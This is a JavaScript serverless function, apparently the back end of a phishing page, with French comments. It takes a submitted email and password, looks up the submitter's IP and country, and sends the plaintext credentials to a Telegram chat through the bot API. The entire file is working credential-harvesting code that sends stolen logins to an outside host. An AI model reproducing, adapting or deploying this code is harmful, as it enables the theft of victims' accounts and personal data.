export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Méthode non autorisée" });
  }

  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Email et mot de passe requis" });
    }

    // ✅ Récupération IP (Netlify fournit x-nf-client-connection-ip)
    const ip =
      req.headers["x-nf-client-connection-ip"] ||
      req.headers["x-forwarded-for"] ||
      "IP inconnue";

    // ✅ Localisation (pays)
    let country = "";
    try {
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoResponse.ok) {
        const geoData = await geoResponse.json();
        country = geoData.country_name ? ` (${geoData.country_name})` : "";
      }
    } catch (e) {
      console.warn("Impossible de récupérer la localisation:", e);
    }

    // ✅ Variables d'environnement (configurées dans Netlify)
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `Nouvelle soumission :
🌍 IP : ${ip}${country}
📧 Email : ${email}
🔑 Mot de passe : ${password}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });

    if (!response.ok) {
      throw new Error(`Erreur Telegram API: ${response.status}`);
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error("Erreur webhook:", error);
    return res.status(500).json({ error: error.message });
  }
}
